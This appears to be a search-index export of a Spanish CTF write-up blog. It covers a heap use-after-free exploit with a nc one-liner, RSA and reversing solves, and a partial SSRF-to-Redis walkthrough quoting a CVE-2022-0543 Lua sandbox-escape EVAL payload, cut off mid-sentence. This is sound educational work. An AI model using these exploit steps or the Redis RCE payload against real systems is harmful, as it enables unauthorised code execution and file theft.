PIE enabled  También tenemos el código fuente en C:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int menu() { printf(\"*** WINBLOWS LOGIN *********\\n\" \"1. Login into user.\\n\" \"2. Sign out.\\n\" \"3. Print flag.\\n\" \"4. Lock user.\\n\" \"5. Restore user.\\n\" \"\u0026gt; \"); int resp = 0; scanf(\"%d\", \u0026amp;resp); while (getchar() != '\\n'); return resp; } struct creds { void *padding; char name[32]; int admin; }; struct creds *curr; struct creds *save; char *fake_flag; int main() { char buff[64]; setbuf(stdout, NULL); setbuf(stdin, NULL); while (1) { switch (menu()) { case 1: // Login curr = malloc(sizeof(*curr)); printf(\"Username: \"); fgets(curr-\u0026gt;name, sizeof(curr-\u0026gt;name), stdin); strtok(curr-\u0026gt;name, \"\\n\"); curr-\u0026gt;admin = 0; break; case 2: // Sign out if (!curr) { puts(\"You are not logged in!\"); break; } free(curr); curr = NULL; puts(\"You have been successfully logged out.\"); break; case 3: // Print flag if (curr \u0026amp;\u0026amp; curr-\u0026gt;admin) { puts(\"Here's your flag:\"); system(\"/bin/cat /flag.txt\"); } else { if (!fake_flag) { puts(\"You are not admin. Would you like to create a new flag instead?\"); fgets(buff, sizeof(buff), stdin); fake_flag = strdup(buff); } printf(\"Here's your flag: %s\", fake_flag); } break; case 4: // Lock user if (curr == NULL) { puts(\"You are not logged in!\"); break; } puts(\"User has been locked now.\"); save = curr; break; case 5: // Restore user if (curr != NULL) { puts(\"You are already logged. Sign out first!\"); } else if (save == NULL) { puts(\"No user is currently locked!\"); } else { printf(\"Welcome back, %s!\\n\", save-\u0026gt;name); curr = save; save = NULL; } break; default: puts(\"Invalid choice\"); } } }  El programa tiene cinco opciones:\n Iniciar sesión como un nuevo usuario Cerrar sesión Mostrar la flag o introducir una flag falsa Guardar un usuario Restaurar un usuario  Algunos puntos importantes sobre el programa:\n Los usuarios se almacenan en el heap porque se utiliza malloc Hay dos punteros a una struct cred, que son: curr y save Si cerramos sesión (2), el puntero curr será liberado con free y puesto a NULL Si mostramos la flag (3) sin ser admin, podremos introducir una fake_flag que será guardada mediante strdup Si mostramos la flag (3) siendo admin, obtendremos la flag real Podemos guardar el usuario al que apunta curr en save si estamos autenticados Podemos restaurar el puntero save a curr si no estamos autenticados  Este programa es vulnerable a Use After Free, que consiste en liberar un objeto del heap y utilizarlo de nuevo.\nRecordemos que free no borra los datos del heap, solo marca el chunk como no utilizado.\nLa vulnerabilidad de Use After Free viene del uso de strdup después de liberar el puntero curr. La función strdup guarda la cadena introducida en el heap utilizando malloc con una cantidad de bytes igual a la longitud de la cadena. El comportamiento de malloc es reservar un cierto número de bytes en el heap, aunque este proceso puede ser más rápido si malloc es capaz de reutilizar un chunk recientemente liberado. Por tanto, si liberamos curr y añadimos una cadena con strdup con el mismo tamaño que el chunk que tenía curr, la cadena se guardará en ese mismo sitio.\nVamos a verlo en GDB. Primero iniciamos sesión (1):\n$ gdb -q login Reading symbols from login... (No debugging symbols found in login) gef➤ break menu Breakpoint 1 at 0xa1e gef➤ run Starting program: ./login Breakpoint 1, 0x0000555555400a1e in menu ()  gef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 1 Username: AAAABBBBCCCC Breakpoint 1, 0x0000555555400a1e in menu ()  Ahora podemos encontrar este nombre de usuario en memoria:\ngef➤ grep AAAABBBBCCCC [+] Searching 'AAAABBBBCCCC' in memory [+] In '[heap]'(0x555555603000-0x555555624000), permission=rw- 0x5555556032a8 - 0x5555556032b4 → \"AAAABBBBCCCC\" gef➤ x/20x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x41414141 0x42424242 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00020d31 0x00000000  Nótese que examinamos unos bytes antes de la coincidencia para observar toda la estructura y los metadatos del chunk (0x41), que indican que el chunk tiene 0x40 (64) bytes reservados y que el chunk anteriro está en uso (ya que 0x41 acaba en 1).\nAhora podemos llamar a free cerrando sesión (2):\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 2 You have been successfully logged out. Breakpoint 1, 0x0000555555400a1e in menu ()  Si revisamos el heap, vemos que hay algunas diferencias:\ngef➤ x/20x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x55603010 0x00005555 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00020d31 0x00000000  Ahora, el nombre de usuario se ha sobrescrito con la dirección del chunk anterior.\nVeamos qué pasa si ponemos una fake_flag utilizando strdup (3) con una longitud pequeña:\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? EEEE Here's your flag: EEEE Breakpoint 1, 0x0000555555400a1e in menu ()  Este es el heap en este punto:\ngef➤ x/28x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x00000000 0x00000000 0x55603010 0x00005555 0x5555556032b0: 0x43434343 0x00000000 0x00000000 0x00000000 0x5555556032c0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032d0: 0x00000000 0x00000000 0x00000021 0x00000000 0x5555556032e0: 0x45454545 0x0000000a 0x00000000 0x00000000 0x5555556032f0: 0x00000000 0x00000000 0x00020d11 0x00000000  Vemos que EEEE (y el carácter de salto de línea) se almacenan en el heap en otro chunk (de tamaño 0x20, 32). La función strdup reservará espacio suficiente en memoria para guardar la cadena (el múltiplo de 16 más cercano, mayor o igual que el tamaño de la cadena). Nótese que tenemos 16 bytes para los metadatos del chunk y 5 bytes para la cadena, por lo que el múltiplo más cercano es 32.\nLa vulnerabilidad de Use After Free viene cuando malloc encuentra un chunk recientemente liberado, y esto solo ocurre si malloc necesita reservar el mismo número de bytes que tenía el chunk liberado. Por tanto, si introducimos una fake_flag con la longitud adecuada, sus metadatos serán 0x41 y entonces malloc reutilizará este chunk.\nPodemos repetir el proceso anterior hasta introducir la fake_flag:\ngef➤ continue Continuing. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Here's your flag: EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Breakpoint 1, 0x0000555555400a1e in menu ()  Hemos introducido 48 caracteres. Este es el heap ahora:\ngef➤ x/28x 0x555555603290 0x555555603290: 0x00000000 0x00000000 0x00000041 0x00000000 0x5555556032a0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032b0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032c0: 0x45454545 0x45454545 0x45454545 0x45454545 0x5555556032d0: 0x0000000a 0x00000000 0x00020d31 0x00000000 0x5555556032e0: 0x00000000 0x00000000 0x00000000 0x00000000 0x5555556032f0: 0x00000000 0x00000000 0x00000000 0x00000000  En este momento, si hubiera una estructura de usuario en ese chunk del heap, tendríamos un atributo admin != 0, por lo que podríamos leer la flag real.\nNo obstante, cuando se libera el puntero curr, también se pone a NULL. Por cuerte, tenemos la opción de guardar temporalmente el puntero curr en save y restaurarlo más tarde, de manera que podemos obtener lo que queremos.\nPor tanto, este es el proceso de explotación:\n Iniciar sesión con malloc (1) Guardar el puntero curr en save (4) Cerrar sesión para llamar a free (2) Introducir una fake_flag de 48 caracteres (3) Restaurar el puntero save en curr Mostrar la flag real (3)  Vamos a hacerlo directamente en la instancia remota:\n$ nc thekidofarcrania.com 13226 *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 1 Username: user *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 4 User has been locked now. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 2 You have been successfully logged out. *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 You are not admin. Would you like to create a new flag instead? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Here's your flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 5 Welcome back, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ! *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; 3 Here's your flag: CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP} *** WINBLOWS LOGIN ********* 1. Login into user. 2. Sign out. 3. Print flag. 4. Lock user. 5. Restore user. \u0026gt; ^C  Usando un \u0026ldquo;one-liner\u0026rdquo;, podemos extraer solamente la flag:\n$ python3 -c 'print(\"\\n\".join([\"1\", \"user\", \"4\", \"2\", \"3\", \"A\" * 48, \"5\", \"3\"]))' | timeout 1 nc thekidofarcrania.com 13226 | grep CTFlearn CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/poor-login/","section":"ctf","summary":"Binario de 64 bits. Explotación del heap. Use After Free","time":5,"title":"Poor Login"},{"contents":"El reto pide que nos autentiquemos en una URL dada mediante una petición POST.\nPrimero de todo, vamos a realizar una petición GET para ver si nos dan las credenciales, utilizando curl:\n$ curl http://165.227.106.113/post.php \u0026lt;h1%gt;This site takes POST data that you have not submitted!\u0026lt;/h1\u0026gt;\u0026lt;!-- username: admin | password: 71urlkufpsdnlkadsf --\u0026gt;  Y aquí las tenemos. Ahora solamente tenemos que usar una petición POST con esta información. Si usamos -d en curl para poner el cuerpo de la petición, el método de la petición se pone por defecto en POST, por lo que no es necesario indicar -X POST:\n$ curl http://165.227.106.113/post.php -d 'username=admin\u0026password=71urlkufpsdnlkadsf' \u0026lt;h1\u0026gt;CTFlearn{p0st_d4t4_4ll_d4y}\u0026lt;/h1\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/ctflearn/web/post-practice/","section":"ctf","summary":"Petición POST HTTP","time":0,"title":"POST Practice"},{"contents":"Se nos proporciona este código en Python que cifra la flag:\nfromCrypto.Util.numberimport* p=getPrime(1024) q=getPrime(1024) n=p*q e=65537 m=bytes_to_long(open(\"flag.txt\", \"rb\").read().strip()) c=pow(m, e, n) pqqp=(pow(p, q, n) +pow(q, p, n)) %n print(f\"{n= }\") print(f\"{e= }\") print(f\"{c= }\") print(f\"{pqqp= }\")  Y tenemos el archivo output.txt:\nn = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 e = 65537 c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642  En primer lugar, tenemos que expresar $p^q + q^p \\pmod{n}$ de otra manera.\nPor el Pequeño Teorema de Fermat, tenemos que:\n$$ p^q \\equiv p \\mod{q} \\Longrightarrow p^{q - 1} \\equiv 1 \\mod{q} $$\nY entonces,\n$$ p^{q - 1} = k \\cdot q + 1 \\Longrightarrow p^q = p (k \\cdot q + 1) ; k \\in \\mathbb{Z} $$\nDe forma similar, $q^p = q (l \\cdot p + 1)$ para $l \\in \\mathbb{Z}$\nPor tanto,\n$$ \\begin{align} p^q + q^p \u0026amp; = p \\cdot (k \\cdot q + 1) + q \\cdot (l \\cdot p + 1) \\newline \u0026amp; = (k + l) \\cdot pq + p + q \\newline \u0026amp; = (k + l) \\cdot n + p + q \\end{align} $$\nY entonces $p^q + q^p \\equiv p + q \\pmod{m}$, lo cual es crucial para descifrar RSA.\nNecesitamos encontrar $d = e^{-1} \\pmod{\\phi(n)}$, y\n$$ \\phi(n) = (p - 1) \\cdot (q - 1) = pq - (p + q) + 1 = n - (p + q) + 1 $$\nLuego, descifraremos el texto cifrado como $m = c^d \\pmod{n}$.\nPodemos hacer todo esto con Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; n = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 \u0026gt;\u0026gt;\u0026gt; e = 65537 \u0026gt;\u0026gt;\u0026gt; c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 \u0026gt;\u0026gt;\u0026gt; pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642 \u0026gt;\u0026gt;\u0026gt; phi_n = n - pqqp + 1 \u0026gt;\u0026gt;\u0026gt; d = pow(e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, n) \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ictf{can_you_proof_that_p^q+q^p_is_actually_p+q?}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/pqqp/","section":"ctf","summary":"ImaginaryCTF 07/09/2022. 75 puntos. RSA. Pequeño Teorema de Fermat","time":1,"title":"pqqp"},{"contents":"Este reto es solamente una introducción. La flag se muestra directamente: CTFlearn{4m_1_4_r3al_h4ck3r_y3t}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/ctflearn/miscellaneous/practice-flag/","section":"ctf","summary":"Introducción a los CTF","time":0,"title":"Practice Flag"},{"contents":"Se nos proporciona un archivo binario llamado Pusheen. Si lo ejecutamos, veremos un dibujo de un gato:\n$ ./Pusheen ▐▀▄ ▄▀▌ ▄▄▄▄▄▄▄ ▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▄▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▒█▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌ ▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀  Si miramos las cadenas de caracteres imprimibles, vemos que hay muchas que empiezan por e_ (de hecho, hay desde e_0_0 hasta e_66_100). Podemos contarlas de esta manera:\n$ strings Pusheen | wc -l 6767  Estas cadenas de caracteres pueden ser nombres de funciones, ya que el binario no ha sido despojado de sus símbolos:\n$ file Pusheen Pusheen: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, not stripped  Ghidra no será útil esta vez para analizar el binario. Sin embargo, si lo abrimos en IDA, veremos un mensaje de advertencia:\nDe hecho, el nombre del reto habla de grafos, e IDA normalmente muestra el código ensamblador en un grafo. Además, en la descripción del reto se habla precisamente de usar IDA.\nPodemos aumentar el número máximo de nodos:\nY después decirle a IDA que muestre la función main en un grafo. Obtenemos esto:\n¿Guay, no? Esta es la representación gráfica del código: llamadas a funciones, condicionales, bucles\u0026hellip;\nPero bueno, la flag es: HTB{fUn_w17h_CFGz}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/pusheen-loves-graphs/","section":"ctf","summary":"Vista de grafo de un binario","time":0,"title":"Pusheen Loves Graphs"},{"contents":"Se nos proporciona una imagen que contiene un código QR:\nSi lo escaneamos, tendremos la siguiente cadena de caracteres:\nc3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI=  Parece que está codificada en Base64, vamos a tratar de decodificarla:\n$ echo c3ludCB2ZiA6IGEwX29icWxfczBldHJnX2RlX3BicXI= | base64 -d synt vf : a0_obql_s0etrg_de_pbqr  Pero no vemos nada legible. Parece que se está utilizando un algoritmo de sustitución como ROT13. Vayamos a CyberChef para comprobarlo:\nVemos: \u0026ldquo;flag is : n0_body_f0rget_qr_code\u0026rdquo;, por lo que la flag es: CTFlearn{n0_body_f0rget_qr_code}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/ctflearn/miscellaneous/qr-code/","section":"ctf","summary":"Escaneo de código QR. Base64. ROT13","time":0,"title":"QR Code"},{"contents":"Se nos proporciona un binario llamado rebuilding:\n$ file rebuilding rebuilding: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7a145f3a4b213cf895a735e2b26adffc044c190, not stripped  Si lo ejecutamos, nos pide poner un argumento de línea de comandos:\n$ ./rebuilding Preparing secret keys Missing required argument  Vamos a abrirlo en Ghidra para descompilarlo. Esta es la función main:\nundefined8 main(intargc, longargv) { int__c; size_tlength; undefined8 ret; intchecks; inti; intj;  if(argc !=2) { puts(\"Missing required argument\"); /* WARNING: Subroutine does not return */ exit(-1); } checks =0; length =strlen(*(char**) (argv +8)); if(length ==32) { for(i =0; i \u0026lt;32; i =i +1) { printf(\"\\rCalculating\"); for(j =0; j \u0026lt;6; j =j +1) { if(j ==i %6) { __c =0x2e; } else{ __c =0x20; } putchar(__c); } fflush(stdout); checks =checks +(uint) ((byte) (encrypted[i] ^key[i %6]) == *(byte *) ((long) i +*(long*) (argv +8))); usleep(200000); } puts(\"\"); if(checks ==32) { puts(\"The password is correct\"); ret =0; } else{ puts(\"The password is incorrect\"); ret =0xffffffff; } } else{ puts(\"Password length is incorrect\"); ret =0xffffffff; } returnret; }  Lo primero que vemos es que el argumento tiene que ser de 32 bytes, vamos a comprobarlo:\n$ ./rebuilding $(python3 -c 'print(\"A\" * 32)') Preparing secret keys Calculating . The password is incorrect  Genial, ahora tiene la longitud correcta. Luego, el programa realiza una operación XOR con las variables globales encrypted y key y comprueba que el resultado es igual que el argumento pasado. Vamos a ver qué hay en encrypted y en key:\n$ readelf -s rebuilding | grep -E 'encrypted|key' 48: 0000000000201020 34 OBJECT GLOBAL DEFAULT 23 encrypted 51: 0000000000201042 7 OBJECT GLOBAL DEFAULT 23 key  Para ver el contenido con xxd, tenemos que restar 0x20000 a ambas direcciones. Y tenemos los siguientes contenidos:\n$ xxd rebuilding | grep -A 2 1020: 00001020: 2938 2b1e 0642 055d 0702 3110 5108 5a16 )8+..B.]..1.Q.Z. 00001030: 3142 0f33 0a55 0000 151e 1c06 1a43 1359 1B.3.U.......C.Y 00001040: 1400 6875 6d61 6e73 0047 4343 3a20 2855 ..humans.GCC: (U  Aquí vemos que key es \u0026quot;humans\u0026quot; (una cadena de 6 caracteres), y encrypted son solo bytes. Si hacemos la operación XOR entre estos dos, deberíamos obtener el parámetro esperado (la flag). Para esto, podemos usar CyberChef:\nPero no parece correcto. Vamos a usar GDB para ver qué pasa:\n$ gdb -q rebuilding Reading symbols from rebuilding... (No debugging symbols found in rebuilding) gef➤ disassemble main Dump of assembler code for function main: ... 0x0000000000000991 \u0026lt;+266\u0026gt;: lea rax,[rip+0x2006aa] # 0x201042 \u0026lt;key\u0026gt; 0x0000000000000998 \u0026lt;+273\u0026gt;: movzx eax,BYTE PTR [rdx+rax*1] 0x000000000000099c \u0026lt;+277\u0026gt;: xor esi,eax 0x000000000000099e \u0026lt;+279\u0026gt;: mov ecx,esi 0x00000000000009a0 \u0026lt;+281\u0026gt;: mov rax,QWORD PTR [rbp-0x20] 0x00000000000009a4 \u0026lt;+285\u0026gt;: add rax,0x8 0x00000000000009a8 \u0026lt;+289\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000000009ab \u0026lt;+292\u0026gt;: mov eax,DWORD PTR [rbp-0x8] 0x00000000000009ae \u0026lt;+295\u0026gt;: cdqe 0x00000000000009b0 \u0026lt;+297\u0026gt;: add rax,rdx 0x00000000000009b3 \u0026lt;+300\u0026gt;: movzx eax,BYTE PTR [rax] 0x00000000000009b6 \u0026lt;+303\u0026gt;: cmp cl,al 0x00000000000009b8 \u0026lt;+305\u0026gt;: sete al 0x00000000000009bb \u0026lt;+308\u0026gt;: movzx eax,al ... End of assembler dump.  Podemos poner un breakpoint en la instrucción cmp y ejecutar el programa:\ngef➤ break *main+303 Breakpoint 1 at 0x9b6 gef➤ run $(python3 -c 'print(\"A\" * 32)') Starting program: /home/rocky/Desktop/HTB/Challenges/Reversing/Rebuilding/rebuilding $(python3 -c 'print(\"A\" * 32)') Preparing secret keys Calculating. Breakpoint 1, 0x00005555554009b6 in main ()  gef➤ x/i $rip =\u0026gt; 0x5555554009b6 \u0026lt;main+303\u0026gt;: cmp cl,al gef➤ p/c $rcx $1 = 0x48 gef➤ p/c $rax $2 = 0x41  Parece que el valor esperado de $rax es 0x48 (H). Vamos a cambiarlo y continuamos:\ngef➤ set $rax = $rcx gef➤ continue Continuing. Calculating . Breakpoint 1, 0x00005555554009b6 in main ()  gef➤ p/c $rcx $3 = 0x54  Ahora el carácter esperado es 0x54 (T). Podemos continuar este proceso manual hasta obtener la flag HTB{...}. Pero en este punto, podemos crear un script en Python con pwntools para automatizar el proceso de reconstruir la flag:\n$ python3 solve.py [+] Starting local process '/usr/bin/gdb': pid 24165 [+] Flag: HTB{h1d1ng_c0d3s_1n_c0nstruct0r5} [*] Stopped process '/usr/bin/gdb' (pid 24165)  El script completo se puede encontrar aquí: solve.py.\nSin embargo, vamos a ver qué hay en key:\ngef➤ disassemble main Dump of assembler code for function main: ... 0x000055555540098e \u0026lt;+263\u0026gt;: movsxd rdx,edx 0x0000555555400991 \u0026lt;+266\u0026gt;: lea rax,[rip+0x2006aa] # 0x555555601042 \u0026lt;key\u0026gt; 0x0000555555400998 \u0026lt;+273\u0026gt;: movzx eax,BYTE PTR [rdx+rax*1] 0x000055555540099c \u0026lt;+277\u0026gt;: xor esi,eax ... gef➤ x/s 0x555555601042 0x555555601042 \u0026lt;key\u0026gt;: \"aliens\"  Vale, la variable key ha cambiado. Usando \u0026quot;aliens\u0026quot; somos capaces de descifrar la operación XOR con CyberChef para conseguir la flag:\nY el problema era que la variable key se modificaba en un constructor (_INIT_1 en Ghidra):\nvoid_INIT_1() { puts(\"Preparing secret keys\"); key[0] ='a'; key[1] ='l'; key[2] ='i'; key[3] ='e'; key[4] ='n'; key[5] ='s'; return; }  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/reversing/rebuilding/","section":"ctf","summary":"XOR. Clave oculta. Depuración con GDB","time":3,"title":"Rebuilding"},{"contents":"Tenemos una página web como esta:\nPodemos registrar una nueva cuenta e iniciar sesión para ver la siguiente funcionalidad:\nEsta vez no tenemos el código fuente de la aplicación web, por lo que tendremos que encontrar una vulnerabilidad clara o encontrar el código fuente de alguna manera.\nPodemos comenzar a pensar en Server-Side Request Forgery (SSRF). Como en otros retos, sabemos que el servidor web escucha en el puerto 1337, por lo que vamos a probar http://127.0.0.1:1337:\nY obtenemos el código HTML de la página index.html. Por tanto, es vulnerable a SSRF. Podemos probar otro esquema de protocolo como file://:\nGenial, podemos transformar la vulnerabilidad de SSRF en una navegación de directorios y leer archivos del servidor.\nPodemos continuar enumerando procesos para ver qué está pasando. Vemos dos servicios importantes en ejecución:\nEntonces, sabemos que es una aplicación en Node.js que utiliza Redis. Como en otros retos, el código fuente de la aplicación suele estar en /app/index.js. Vamos a verlo:\nPerfecto, tenemos el código fuente. Este es el archivo /app/index.js:\nconst express = require('express') const app = express() const session = require('express-session') const RedisStore = require('connect-redis')(session) const path = require('path') const cookieParser = require('cookie-parser') const nunjucks = require('nunjucks') const routes = require('./routes') const Database = require('./database') const { createClient } = require('redis') const redisClient = createClient({ legacyMode: true }) const db = new Database('redisland.db') app.use(express.json()) app.use(cookieParser()) redisClient.connect().catch(console.error) app.use( session({ store: new RedisStore({ client: redisClient }), saveUninitialized: false, secret: 'r4yh4nb34t5B1gM4c', resave: false }) ) nunjucks.configure('views', { autoescape: true, express: app }) app.set('views', './views') app.use('/static', express.static(path.resolve('static'))) app.use(routes(db)) app.all('*', (req, res) =\u0026gt; { return res.status(404).send({ message: '404 page not found' }) }) ;(async () =\u0026gt; { await db.connect() await db.migrate() app.listen(1337, '0.0.0.0', () =\u0026gt; console.log('Listening on port 1337')) })()  Podemos seguir leyendo código fuente, pero ninguno tiene más información útil para resolver el reto. Todas las librerías de terceros están actualizadas, por lo que no hay vulnerabilidades de procesamiento de imágenes.\nUn tema importante es que no sabemos dónde está la flag. Por tanto, deducimos que tenemos que conseguir ejecución remota de comandos en el servidor para buscar la flag.\nAdemás, como el reto se llama \u0026ldquo;Red Island\u0026rdquo; y sabemos que Redis se usa como almacén de sesiones, la solución tiene que estar relacionada con Redis.\nCon un poco de investigación, llegamos al CVE-2022-0543, que es una manera de ejecutar comandos escapando de una sandbox en Lua. Este artículo muestra cómo explotarlo. Básicamente, utiliza una consulta EVAL en Redis para ejecutar código Lua, y escapa de la sandbox mediante una librería externa compartida:\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0  La librería compartida está disponible en el servidor:\nPor tanto, vamos bien. Ahora necesitamos averiguar cómo interactuar con Redis a través del SSRF.\nCon otro poco de investigación, vemos que curl puede hablar con Redis usando HTTP, pero se necesitan parámetros específicos y no podemos usarlos en esta página web.\nExiste otro protocolo que puede comunicarse con Redis, y es el protocolo gopher://. De hecho, hay maneras de conseguir RCS utilizando este protocolo (sin usar el CVE anterior), pero no funcionan esta vez. Más información en infosecwriteups.com.\nBásicamente, usaremos el código Lua de la consulta EVAL para ejecutar comandos en el servidor. Tenemos que tener cuidado con la codificación URL y algunos campos del protocolo para poner la longitud de contenido correcta.\nPor ejemplo, podemos usar la siguiente URL para ejecutar ls 